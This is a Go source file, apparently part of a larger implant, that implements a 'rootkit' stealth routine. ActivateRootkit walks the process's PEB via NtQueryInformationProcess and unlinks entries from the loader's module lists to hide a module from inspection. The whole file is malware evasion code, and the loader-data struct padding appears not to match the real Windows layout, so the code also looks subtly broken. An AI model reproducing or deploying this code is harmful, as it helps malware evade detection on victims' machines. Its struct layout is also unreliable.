package handlers

import (
	"fmt"
	"sync"
	"unsafe"

	"golang.org/x/sys/windows"
)

type StealthManager struct {
	mu     sync.Mutex
	hidden bool
}

func NewStealthManager() *StealthManager {
	return &StealthManager{}
}

func (sm *StealthManager) ActivateRootkit() string {
	sm.mu.Lock()
	defer sm.mu.Unlock()

	if sm.hidden {
		return ""
	}

	if err := sm.hideFromPEB(); err != nil {
		return ""
	}

	sm.hidden = true
	return "🔒 Stealth mode activated"
}

func (sm *StealthManager) hideFromPEB() error {
	var pbi processBasicInformation

	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	procNtQuery := ntdll.NewProc("NtQueryInformationProcess")

	ret, _, err := procNtQuery.Call(
		uintptr(windows.CurrentProcess()),
		0,
		uintptr(unsafe.Pointer(&pbi)),
		unsafe.Sizeof(pbi),
		0,
	)

	if ret != 0 {
		return fmt.Errorf("NtQueryInformationProcess failed: %v", err)
	}

	pebPtr := (*peb)(unsafe.Pointer(pbi.PebBaseAddress))
	ldr := (*pebLdrData)(unsafe.Pointer(pebPtr.Ldr))

	sm.unlinkEntry(ldr.InLoadOrderModuleList.Flink)
	sm.unlinkEntry(ldr.InMemoryOrderModuleList.Flink)
	sm.unlinkEntry(ldr.InInitializationOrderModuleList.Flink)

	return nil
}

func (sm *StealthManager) unlinkEntry(le *listEntry) {
	if le != nil && le.Flink != nil && le.Blink != nil {
		le.Flink.Blink = le.Blink
		le.Blink.Flink = le.Flink
	}
}

type processBasicInformation struct {
	ExitStatus                   uintptr
	PebBaseAddress               uintptr
	AffinityMask                 uintptr
	BasePriority                 uintptr
	UniqueProcessID              uintptr
	InheritedFromUniqueProcessID uintptr
}

type peb struct {
	_   [24]byte
	Ldr uintptr
}

type pebLdrData struct {
	_                               [40]byte
	InLoadOrderModuleList           listEntry
	InMemoryOrderModuleList         listEntry
	InInitializationOrderModuleList listEntry
}

type listEntry struct {
	Flink *listEntry
	Blink *listEntry
}
